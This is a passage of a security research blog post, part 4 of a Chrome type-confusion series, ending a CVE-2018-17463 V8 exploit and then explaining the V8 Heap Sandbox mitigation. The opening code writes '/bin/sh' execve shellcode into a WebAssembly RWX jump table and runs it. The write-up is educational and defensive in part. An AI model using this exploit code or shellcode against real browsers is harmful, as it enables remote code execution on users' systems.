print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Constructed Memory Read and Write Primitive!&amp;quot;&lt;/span&gt;);

&lt;span class=&#34;hljs-comment&#34;&gt;// Generate RWX region via WASM&lt;/span&gt;
print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Generating a WebAssembly Instance...&amp;quot;&lt;/span&gt;);
&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; wasmCode = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;Uint8Array&lt;/span&gt;([&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;97&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;115&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;109&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;133&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;96&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;127&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;130&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;132&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;112&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;131&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;129&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;145&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;109&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;101&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;109&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;111&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;114&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;121&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;109&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;97&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;105&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;110&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;138&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;132&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;128&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;65&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;42&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;11&lt;/span&gt;]);
&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; wasmModule = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; WebAssembly.Module(wasmCode);
&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; wasmInstance = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; WebAssembly.Instance(wasmModule);
&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; func = wasmInstance.exports.main;

&lt;span class=&#34;hljs-comment&#34;&gt;// Leak WebAssembly Instance Address and Jump Table&lt;/span&gt;
print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Leaking WebAssembly Instance Address...&amp;quot;&lt;/span&gt;);
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; wasmInstanceAddr = memory.addrOf(wasmInstance);
print(&lt;span class=&#34;hljs-string&#34;&gt;`[+] WebAssembly Instance Address @ 0x&lt;span class=&#34;hljs-subst&#34;&gt;${wasmInstanceAddr.toString(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)}&lt;/span&gt;`&lt;/span&gt;);
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; wasmRWXAddr = memory.read64(wasmInstanceAddr + &lt;span class=&#34;hljs-number&#34;&gt;0xF0n&lt;/span&gt;);
print(&lt;span class=&#34;hljs-string&#34;&gt;`[+] WebAssembly RWX Jump Table Address @ 0x&lt;span class=&#34;hljs-subst&#34;&gt;${wasmRWXAddr.toString(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)}&lt;/span&gt;`&lt;/span&gt;);

print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Preparing Shellcode...&amp;quot;&lt;/span&gt;);
&lt;span class=&#34;hljs-comment&#34;&gt;// Linux x64 Shellcode to execute /bin/sh&lt;/span&gt;
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; shellcode = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;Uint8Array&lt;/span&gt;([
    &lt;span class=&#34;hljs-number&#34;&gt;0x6a&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x3b&lt;/span&gt;,                   &lt;span class=&#34;hljs-comment&#34;&gt;// push 59 (syscall number for execve)&lt;/span&gt;
    &lt;span class=&#34;hljs-number&#34;&gt;0x58&lt;/span&gt;,                         &lt;span class=&#34;hljs-comment&#34;&gt;// pop rax&lt;/span&gt;
    &lt;span class=&#34;hljs-number&#34;&gt;0x48&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x31&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xd2&lt;/span&gt;,            &lt;span class=&#34;hljs-comment&#34;&gt;// xor rdx, rdx (envp = NULL)&lt;/span&gt;
    &lt;span class=&#34;hljs-number&#34;&gt;0x48&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x31&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xf6&lt;/span&gt;,            &lt;span class=&#34;hljs-comment&#34;&gt;// xor rsi, rsi (argv = NULL)&lt;/span&gt;
    &lt;span class=&#34;hljs-number&#34;&gt;0x48&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xbf&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x2f&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x62&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x69&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x6e&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x2f&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x73&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x68&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x00&lt;/span&gt;, &lt;span class=&#34;hljs-comment&#34;&gt;// movabs rdi, &amp;quot;/bin/sh\x00&amp;quot;&lt;/span&gt;
    &lt;span class=&#34;hljs-number&#34;&gt;0x57&lt;/span&gt;,                         &lt;span class=&#34;hljs-comment&#34;&gt;// push rdi&lt;/span&gt;
    &lt;span class=&#34;hljs-number&#34;&gt;0x48&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x89&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0xe7&lt;/span&gt;,            &lt;span class=&#34;hljs-comment&#34;&gt;// mov rdi, rsp&lt;/span&gt;
    &lt;span class=&#34;hljs-number&#34;&gt;0x0f&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x05&lt;/span&gt;                    &lt;span class=&#34;hljs-comment&#34;&gt;// syscall&lt;/span&gt;
]);

print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Writing Shellcode to Jump Table Address...&amp;quot;&lt;/span&gt;);
&lt;span class=&#34;hljs-comment&#34;&gt;// Write Shellcode&lt;/span&gt;
memory.write(wasmRWXAddr, shellcode);

print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Spawning Shell...&amp;quot;&lt;/span&gt;);
&lt;span class=&#34;hljs-comment&#34;&gt;// Execute Shellcode&lt;/span&gt;
func();
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;Result&#34;&gt;&lt;a href=&#34;#Result&#34; class=&#34;headerlink&#34; title=&#34;Result&#34;&gt;&lt;/a&gt;Result&lt;/h3&gt;&lt;p&gt;Because this exploit writes shellcode into a wasm instance&amp;#x2019;s jump table in memory, porting the payload to Linux involved only changing the shellcode. I replaced the calc payload with a shell spawner and ran it successfully on Linux.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Windows&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;image%203.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Linux&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;image%204.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;1-4-Summary&#34;&gt;&lt;a href=&#34;#1-4-Summary&#34; class=&#34;headerlink&#34; title=&#34;1.4 Summary&#34;&gt;&lt;/a&gt;1.4 Summary&lt;/h2&gt;&lt;p&gt;We&amp;#x2019;ve now made it to Part 4, and since it&amp;#x2019;s been quite a long journey, let&amp;#x2019;s take a moment to summarize before moving on! (There&amp;#x2019;s still more ahead &amp;#x1F60E;)&lt;/p&gt;
&lt;p&gt;In &lt;strong&gt;Part 1&lt;/strong&gt;, we covered the foundational concepts necessary to understand Chrome&amp;#x2019;s internal architecture and the V8 engine.&lt;/p&gt;
&lt;p&gt;In &lt;strong&gt;Part 2&lt;/strong&gt;, we discussed the concept of &lt;strong&gt;Type Confusion&lt;/strong&gt; &amp;#x2014; why it happens when the JavaScript engine misinterprets internal types, and what security risks it introduces.&lt;/p&gt;
&lt;p&gt;In &lt;strong&gt;Parts 3 through 4 (so far)&lt;/strong&gt;, we took a deep dive into how Type Confusion can be leveraged to build &lt;strong&gt;read/write primitives&lt;/strong&gt;, and how those primitives evolve into a &lt;strong&gt;full exploit chain&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Modern browsers operate using multiple processes and complex memory structures to support their wide range of features. This architecture gives attackers numerous potential vectors to target, and by chaining those vectors together, they can gain the ability to read or write arbitrary data in the heap.&lt;/p&gt;
&lt;p&gt;This research post focused on one such vector &amp;#x2014; &lt;strong&gt;Type Confusion&lt;/strong&gt; &amp;#x2014; showing how it can be exploited to manipulate memory and ultimately achieve &lt;strong&gt;remote code execution (RCE)&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;From a technical standpoint, the exploit for &lt;strong&gt;CVE-2018-17463&lt;/strong&gt; can be thought of as consisting of two major phases:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Vulnerability &amp;#x2192; Primitive Construction Phase:&lt;/strong&gt;&lt;br&gt;This phase involves analyzing the Type Confusion bug and crafting reliable &lt;strong&gt;memory read/write primitives&lt;/strong&gt;. It&amp;#x2019;s primarily about understanding the root cause of the bug and the inner workings of the JavaScript engine.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Primitive &amp;#x2192; Code Execution (Weaponization / Pwn) Phase:&lt;/strong&gt;&lt;br&gt;In this phase, the attacker uses the acquired primitives to target &lt;strong&gt;executable memory (RWX)&lt;/strong&gt; and run arbitrary code. This step belongs more to the traditional &lt;strong&gt;pwnable/exploit engineering&lt;/strong&gt; domain.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;In other words, when viewed through the lens of &lt;strong&gt;CVE-2018-17463&lt;/strong&gt;, everything up to the creation of the memory read/write primitives belongs to &lt;strong&gt;vulnerability and engine-level research&lt;/strong&gt;, while overwriting the &lt;strong&gt;Wasm instance jump table&lt;/strong&gt; to trigger actual RCE falls under &lt;strong&gt;pwnable exploitation&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Now, if you&amp;#x2019;ve studied pwnable before, you might already know what usually follows such an exploit&amp;#x2026;&lt;/p&gt;
&lt;p&gt;That&amp;#x2019;s right &amp;#x2014; &lt;strong&gt;mitigation&lt;/strong&gt;&amp;#x1F62D;&lt;/p&gt;
&lt;p&gt;&lt;del&gt;(As someone studying vulnerabilities, I can&amp;#x2019;t decide whether to laugh or cry &amp;#x1F602;)&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;In V8, optimizations that occur independently of the developer&amp;#x2019;s intentions can often lead to bugs like Type Confusion. Because this happened far too frequently, &lt;strong&gt;V8 introduced a new mitigation called the Heap Sandbox in early 2020&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Let&amp;#x2019;s continue and explore what &lt;strong&gt;Heap Sandbox&lt;/strong&gt; is, and how it mitigates these attacks! &amp;#x314E;.&amp;#x314E;&lt;/p&gt;
&lt;h1 id=&#34;2-V8-Heap-Sandbox&#34;&gt;&lt;a href=&#34;#2-V8-Heap-Sandbox&#34; class=&#34;headerlink&#34; title=&#34;2. V8 Heap Sandbox&#34;&gt;&lt;/a&gt;2. V8 Heap Sandbox&lt;/h1&gt;&lt;p&gt;In Chapter 2, &amp;#x201C;sandbox&amp;#x201D; doesn&amp;#x2019;t mean Chrome&amp;#x2019;s process sandbox but rather the heap sandbox inside the renderer &amp;#x2014; i.e., the V8 heap sandbox.&lt;/p&gt;
&lt;h2 id=&#34;2-1-Motivation&#34;&gt;&lt;a href=&#34;#2-1-Motivation&#34; class=&#34;headerlink&#34; title=&#34;2.1 Motivation&#34;&gt;&lt;/a&gt;2.1 Motivation&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;image%205.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;For several years before the sandbox, over 60% of Chrome exploits started in V8, but many of those weren&amp;#x2019;t classic memory bugs (UAF, OOB). They were subtle logical bugs in the JIT compiler or runtime &amp;#x2014; or memory corruptions caused by such logic bugs. These aren&amp;#x2019;t problems you can eliminate just by writing &amp;#x201C;better&amp;#x201D; code, because the compiler itself becomes an attack surface. V8 therefore needed a tailored defensive layer that prevents memory corruption in the heap from immediately compromising the rest of the process &amp;#x2014; that is the core goal of the &lt;strong&gt;V8 Heap Sandbox&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Put it simply, the goal is to ensure that &lt;strong&gt;even if a vulnerability causes an arbitrary value (especially a pointer) to be written, that value cannot immediately take over the engine&amp;#x2019;s control flow&lt;/strong&gt;. Like any security feature, the sandbox must keep overhead low. To achieve this, the Heap Sandbox generally follows these conceptual strategies:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Memory partitioning / isolation:&lt;/strong&gt; separate the engine heap memory (and related structures) from other runtime memory (host address space, JIT code pages, etc.) so that a heap value cannot directly translate into an external executable address.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Pointer encapsulation &amp;amp; validation:&lt;/strong&gt; encode (tag) pointer representations stored on the heap or validate pointers before they are used, preventing heap values from being mixed directly with host addresses.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Restricted dereferencing / bounds checks:&lt;/strong&gt; strictly distinguish whether a heap value is an executable code address and prevent interpreting arbitrary data as function pointers.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Overall, V8&amp;#x2019;s sandbox design focuses on protecting the rest of the process under the assumption that an attacker may be able to corrupt heap memory.&lt;/p&gt;
&lt;h2 id=&#34;2-2-Implementation&#34;&gt;&lt;a href=&#34;#2-2-Implementation&#34; class=&#34;headerlink&#34; title=&#34;2.2 Implementation&#34;&gt;&lt;/a&gt;2.2 Implementation&lt;/h2&gt;&lt;p&gt;The key idea in the sandbox design is to change how V8 dereferences addresses: instead of doing direct pointer arithmetic inside the engine, treat heap &lt;strong&gt;references as offsets/indices&lt;/strong&gt;. This prevents raw heap values from becoming host addresses or executable pointers, and lets the runtime control pointer usage tightly. The high-level concept can be broken down as follows.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image%206.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;This concept can be divided into &amp;#x201C;sandbox address-space allocation / handling of pointers inside &amp;amp; outside the sandbox / trusted space,&amp;#x201D; and we&amp;#x2019;ll take a closer look at each of those in detail.&lt;/p&gt;
&lt;h3 id=&#34;1-Sandbox-Address-Space&#34;&gt;&lt;a href=&#34;#1-Sandbox-Address-Space&#34; class=&#34;headerlink&#34; title=&#34;1. Sandbox Address Space&#34;&gt;&lt;/a&gt;1. Sandbox Address Space&lt;/h3&gt;&lt;p&gt;The sandbox reserves a &lt;strong&gt;large virtual address space&lt;/strong&gt; that contains the memory V8 directly touches (engine heap, ArrayBuffer backing stores, Wasm memory, etc.). This space is reserved in virtual address space (potentially terabytes) and treated as the &amp;#x201C;sandbox.&amp;#x201D; Generous guard regions surround the sandbox to prevent out-of-bounds sandbox indices from escaping into the host address space, both logically and physically.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image%207.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;2-Sandboxed-Pointers-pointers-inside-the-sandbox&#34;&gt;&lt;a href=&#34;#2-Sandboxed-Pointers-pointers-inside-the-sandbox&#34; class=&#34;headerlink&#34; title=&#34;2. Sandboxed Pointers (pointers inside the sandbox )&#34;&gt;&lt;/a&gt;2. Sandboxed Pointers (pointers inside the sandbox )&lt;/h3&gt;&lt;p&gt;References inside the sandbox are represented not as raw physical addresses but as &lt;strong&gt;offsets from the sandbox base&lt;/strong&gt;. A SandboxedPointer uses a fixed-width offset (for example, 40 bits) relative to the sandbox base, so even if the offset value is corrupted, the resulting address remains inside the sandbox. Security-wise this blocks arbitrary access outside the sandbox; performance-wise it&amp;#x2019;s efficient because the sandbox base can be cached in a CPU register and offset&amp;#x2192;address conversion on x86-64 requires only two extra instructions (and one on ARM64).&lt;/p&gt;
&lt;h3 id=&#34;3-Pointer-Tables-pointers-outside-the-sandbox&#34;&gt;&lt;a href=&#34;#3-Pointer-Tables-pointers-outside-the-sandbox&#34; class=&#34;headerlink&#34; title=&#34;3. Pointer Tables (pointers outside the sandbox )&#34;&gt;&lt;/a&gt;3. Pointer Tables (pointers outside the sandbox )&lt;/h3&gt;&lt;p&gt;Objects outside the sandbox (e.g., DOM nodes, external extension objects) are not referenced directly from within the sandbox. Instead, the sandbox stores &lt;strong&gt;indices into a pointer table&lt;/strong&gt;. Sandboxed objects hold a table index rather than the external pointer itself; at runtime the sandbox resolves that index to an external pointer. This improves safety: spatial safety is enforced by bounds-checking table indices; temporal safety is improved because GC can manage and reclaim table entries. Table entries can also include &lt;strong&gt;type tags&lt;/strong&gt; so that when a pointer is loaded it can be validated against an expected type &amp;#x2014; helping prevent Type Confusion attacks.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image%208.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;4-Trusted-Space&#34;&gt;&lt;a href=&#34;#4-Trusted-Space&#34; class=&#34;headerlink&#34; title=&#34;4. Trusted Space&#34;&gt;&lt;/a&gt;4. Trusted Space&lt;/h3&gt;&lt;p&gt;Certain internal V8 objects (for example, bytecode arrays, deoptimization data) are difficult to protect solely with the sandbox or could be risky if mishandled. V8 therefore puts especially sensitive objects into a separate &lt;strong&gt;trusted heap area&lt;/strong&gt; outside the sandbox. This trusted area has its own pointer-compression cage and is accessed from the sandbox via an indirection mechanism (e.g., a Trusted Pointer Table). As a result, even if an attacker corrupts data inside the sandbox, the chances of directly manipulating sensitive trusted objects are greatly reduced.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image%209.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;Summary&#34;&gt;&lt;a href=&#34;#Summary&#34; class=&#34;headerlink&#34; title=&#34;Summary&#34;&gt;&lt;/a&gt;Summary&lt;/h3&gt;&lt;p&gt;In short, the sandbox architecture: (1) isolates the heap into a large virtual address region, (2) represents pointers inside the sandbox as safe offsets, (3) uses index-based tables for references to outside-the-sandbox objects, and (4) isolates especially sensitive objects into a trusted space. This multi-layered approach effectively blocks heap-based vulnerabilities from immediately turning into execution control compromises.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image%2010.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;Outro&#34;&gt;&lt;a href=&#34;#Outro&#34; class=&#34;headerlink&#34; title=&#34;Outro&#34;&gt;&lt;/a&gt;Outro&lt;/h1&gt;&lt;p&gt;Before the sandbox, simply overwriting a heap pointer so that a &lt;code&gt;TypedArray&lt;/code&gt;&amp;#x2019;s &lt;code&gt;backing_store&lt;/code&gt; pointed at attacker-chosen memory was often enough to get arbitrary read/write (AAR/AAW) across process memory.&lt;/p&gt;
&lt;p&gt;With the sandbox, the difficulty of Chrome exploitation increased dramatically. The most direct effect is that pointer overwrite attacks are harder: the sandbox stops simple pointer casting or ensures that a corrupted value won&amp;#x2019;t be treated as a valid execution pointer. As a result, achieving a renderer-process RCE from a single vulnerability typically requires a &lt;strong&gt;sandbox escape&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;But raising the difficulty only goes so far &amp;#x2014; if you can escape the sandbox&amp;#x2026;?&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image%2011.jpg&#34; alt=&#34;image.jpg&#34;&gt;&lt;/p&gt;
&lt;p&gt;In the next post I&amp;#x2019;ll cover how renderer RCE is achieved after the sandbox was introduced.&lt;/p&gt;
&lt;p&gt;See you next time! &amp;#x1F64C;&lt;/p&gt;
&lt;h1 id=&#34;Reference&#34;&gt;&lt;a href=&#34;#Reference&#34; class=&#34;headerlink&#34; title=&#34;Reference&#34;&gt;&lt;/a&gt;Reference&lt;/h1&gt;&lt;p&gt;&lt;a href=&#34;https://jhalon.github.io/chrome-browser-exploitation-3/&#34;&gt;https://jhalon.github.io/chrome-browser-exploitation-3/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://v8.dev/blog/sandbox&#34;&gt;https://v8.dev/blog/sandbox&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/&#34;&gt;https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://saelo.github.io/presentations/offensivecon_24_the_v8_heap_sandbox.pdf&#34;&gt;https://saelo.github.io/presentations/offensivecon_24_the_v8_heap_sandbox.pdf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://m.blog.naver.com/funraon/223669595583&#34;&gt;https://m.blog.naver.com/funraon/223669595583&lt;/a&gt;&lt;/p&gt;
 - hack &amp; life">
  <meta property="og:image" content="https://hackyboiz.github.io/2025/10/10/OUYA77/Chrome_part4/kr/TypeConfusion101_Part4.jpg">
  <meta property="og:url" content="https://hackyboiz.github.io/">

  <link rel="canonical" href="https://hackyboiz.github.io/2025/10/10/ouya77/chrome_part4/en/">

  <title>[Research] Starting Chrome Exploitation with Type Confusion 101 ^-^☆ Part 4.(EN) - hackyboiz</title>

  <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">


  <link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css">
  <link rel="stylesheet" href="/lib/hint/hint.min.css">

  
    
    <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css">
  

  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_6peoq002giu.css">
<link rel="stylesheet" href="/.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
<link rel="stylesheet" href="/.css">


<link rel="stylesheet" href="/css/main.css">

<!-- 自定义样式保持在最底部 -->


  <script src="/js/utils.js"></script>
  <script src="/js/color-schema.js"></script>

<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
</head>


<body>
  <header style="height: 40vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">&nbsp;<strong>Hackyboiz</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
